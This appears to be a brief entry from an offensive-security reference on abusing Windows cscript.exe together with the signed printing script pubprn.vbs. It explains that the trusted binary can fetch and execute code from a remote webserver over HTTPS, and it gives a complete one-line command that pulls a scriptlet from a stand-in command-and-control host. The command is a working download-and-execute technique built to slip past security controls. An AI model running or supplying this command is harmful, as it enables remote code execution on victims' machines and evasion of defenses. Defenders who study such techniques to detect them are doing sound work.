Cscript.exe is a command line version of the Windows Script Host that provides command line options for setting script properties.

SubTee (Casey Smith) discovered that it was possible to misuse this utility in combination with ``C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs`` to get code execution from a remote webserver. This utility has some benefits over other tools as its a trusted binary, proxy aware and supports HTTPS.  

Cscript do not work with untrusted SSL certificates if using over HTTPS:

.. code-block:: python

	cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers "script:https://www.c2.com/news/j9hau_cs"
